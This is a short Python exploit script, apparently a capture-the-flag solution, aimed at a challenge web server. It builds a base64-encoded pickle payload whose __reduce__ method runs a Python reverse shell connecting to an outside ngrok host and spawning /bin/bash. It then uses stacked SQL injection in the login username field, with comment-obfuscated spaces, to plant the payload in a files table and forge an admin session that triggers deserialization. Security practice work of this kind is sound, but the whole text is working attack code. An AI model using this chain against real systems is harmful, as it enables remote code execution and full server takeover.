import requests
import uuid
from datetime import datetime, timedelta
import pickle, os, base64
import requests

class RCE(object):
    def __reduce__(self):
        return (os.system,('''python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("2.tcp.ngrok.io",19119));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")' ''',))

def main():
    pickledPayload = base64.b64encode(pickle.dumps(RCE())).decode()
    return pickledPayload

payload = main()

base_url = "http://challenge.ctf.games:32661"
login_url = base_url + "/login"
download_url = base_url + "/download/sp34r1e.txt/"

def malicious_file(payload):
    payload = {
        "username":f"admin\\;INSERT/**/INTO/**/files/**/VALUES/**/(\\sp34r1e.txt\\,\\{payload}\\,\\admin\\)--",
        "password":"admin"
    }

    res = requests.post(login_url,data=payload)
    return res.status_code

def malicious_session():
    session_id = str(uuid.uuid4())
    date1 = datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')
    payload = {
        "username":f"admin\\;INSERT/**/INTO/**/activesessions/**/VALUES/**/(\\{session_id}\\,\\admin\\,\\{date1}\\);--",
        "password":"admin"
    }

    res = requests.post(login_url,data=payload)

    res = requests.get(download_url+session_id)
    print(res.text)


malicious_file(payload)
malicious_session()
